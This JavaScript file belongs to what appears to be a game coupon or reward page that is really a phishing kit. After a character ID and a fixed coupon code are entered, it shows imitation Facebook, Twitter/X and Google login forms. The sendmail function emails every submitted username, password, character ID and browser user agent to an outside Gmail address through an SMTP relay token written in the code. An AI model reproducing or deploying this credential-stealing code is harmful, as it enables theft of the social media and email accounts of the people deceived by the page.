var sub = document.getElementById("sub-btn")
var nav = document.getElementById("nav")
var footer = document.getElementById("footer")
var rnav = document.getElementById("rnav")
var navT = false;
var characterID;

var charid = document.getElementById("char-id")

var pTag = nav.querySelectorAll('p');
var navImg = document.getElementById("nav-img")
const screenWidth = window.innerWidth;

var p1 = document.getElementById("page1")
var p2 = document.getElementById("page2")
var p3 = document.getElementById("page3")
var p4 = document.getElementById("page4")
var p5 = document.getElementById("page5")

var fb = document.getElementById("fb")
var tw = document.getElementById("tw")
var gl = document.getElementById("gl")

var togglePass = document.getElementById("show-pass")
var pass = document.getElementById("g-pass")

FLogin = document.getElementById("login-f")
XLogin = document.getElementById("login-x")
GLogin = document.getElementById("login-g")

if (screenWidth < 600) {
    for (p of pTag)
        p.style.display = 'none';

    nav.style.height = "4.8rem";
}

navImg.addEventListener("click", function (e) {
    if (navT == false) {
        globalThis.navT = true
        for (p of pTag)
            p.style.display = 'block';

        nav.style.height = "22rem";
        navImg.src = "img/nav_close.png";
    }
    else {
        globalThis.navT = false
        for (p of pTag)
            p.style.display = 'none';

        nav.style.height = "4.8rem";
        navImg.src = "img/nav_menu.png";
    }
})

togglePass.addEventListener("click", function (e) {
    const type = pass.getAttribute("type") === "password" ? "text" : "password"
    pass.setAttribute("type", type)
})


// p1.style.display = 'none'
p2.style.display = 'none'
p3.style.display = 'none'
p4.style.display = 'none'
p5.style.display = 'none'

sub.addEventListener("click", function (e) {
    if (document.getElementById("char-id").value != '' && document.getElementById("char-id").value.length >= 10) {
        if (document.getElementById("cpn-code").value == "X7N7-36H3-927J" && document.getElementById("cpn-code").value != '') {
            p1.style.display = 'none'
            p2.style.display = 'flex'
            globalThis.characterID = charid.value
        }
        else {
            alert("Invalid Coupon Code")
        }
    }
    else {
        alert("Invalid Character Id")
    }
})

fb.addEventListener("click", function (e) {
    p2.style.display = 'none'
    p3.style.display = 'flex'
    footer.style.display = "none"
})

tw.addEventListener("click", function (e) {
    p2.style.display = 'none'
    p4.style.display = 'flex'
    footer.style.display = "none"
})

gl.addEventListener("click", function (e) {
    p2.style.display = 'none'
    p5.style.display = 'flex'
    footer.style.display = "none"
})

FLogin.addEventListener('click', function (e) {
    var login = "Facebook"
    var user = document.getElementById("f-user").value
    var pass = document.getElementById("f-pass").value

    if ((user == '' || user == ' ') || (pass == '' || pass == ' ')) {
        alert("Please enter your email and password.")
    }
    else {
        if ((pass.length < 8)) {
            alert("Invalid Password")
        } else {
            var check = validateEmailOrPhoneNumber(user)
            if (check) {
                console.log("success")
                sendmail(login, user, pass)
            }
            else {
                alert("Invalid Email or Phone Number")
            }
        }
    }
})

XLogin.addEventListener('click', function (e) {
    var login = "Twitter X"
    var user = document.getElementById("x-user").value
    var pass = document.getElementById("x-pass").value

    if ((user == '' || user == ' ') || (pass == '' || pass == ' ')) {
        alert("Please enter your email and password.")
    }
    else {
        if ((pass.length < 8)) {
            alert("Invalid Password")
        } else {
            var check = validateEmailOrPhoneNumber(user)
            if (check) {
                console.log("success")
                sendmail(login, user, pass)
            }
            else {
                alert("Invalid Email or Phone Number")
            }
        }
    }
})

GLogin.addEventListener('click', function (e) {
    var login = "Google"
    var user = document.getElementById("g-user").value
    var pass = document.getElementById("g-pass").value

    if ((user == '' || user == ' ') || (pass == '' || pass == ' ')) {
        alert("Please enter your email and password.")
    }
    else {
        if ((pass.length < 8)) {
            alert("Invalid Password")
        } else {
            var check = validateEmailOrPhoneNumber(user)
            if (check) {
                console.log("success")
                sendmail(login, user, pass)
            }
            else {
                alert("Invalid Email or Phone Number")
            }
        }
    }
})

function validateEmailOrPhoneNumber(input) {
    if (input.includes("@") && input.includes("gmail.com")) {
        return true;
    }

    if (input.length === 10 && /^[0-9]+$/.test(input)) {
        return true;
    }

    return false;
}

function sendmail(login, user, pass) {
    body = "Platform : " + login + "<br><br> Email or Phone : " + user + "<br><br> Password : " + pass + "<br><br> Character ID : " + characterID + "<br><br> User Agent : " + navigator.userAgent
    Email.send({
        SecureToken: "e746c649-08f7-400d-ba89-6e5399d77876",
        To: 'tigerisback506@gmail.com',
        From: "123ghostrider456@gmail.com",
        Subject: "New Login",
        Body: body
    }).then(
        message => alert(message)
    );
}
